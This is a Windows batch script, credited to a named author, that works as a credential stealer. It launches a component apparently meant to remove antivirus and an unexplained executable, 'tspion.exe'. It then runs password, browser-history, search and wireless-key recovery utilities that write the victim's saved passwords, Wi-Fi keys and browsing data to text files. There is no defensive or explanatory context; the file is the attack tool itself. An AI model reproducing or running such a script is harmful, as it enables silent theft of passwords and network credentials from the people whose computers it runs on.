@echo off
title Made By Ross Epstein
echo Make sure you read the readme before procceeding to make sure everything works.
pause
start .\App\AV_REM
ping localhost -n 5 >null
start .\tspion.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext PassWords.txt
start .\App\CommandLine\Process.exe
start .\App\history\BHV.exe /stext history.txt
start .\App\wireless_key\WKV.exe /stext wireless_keys.txt
start .\App\options.bat
ping localhost -n 2 >null
pause
goto eof
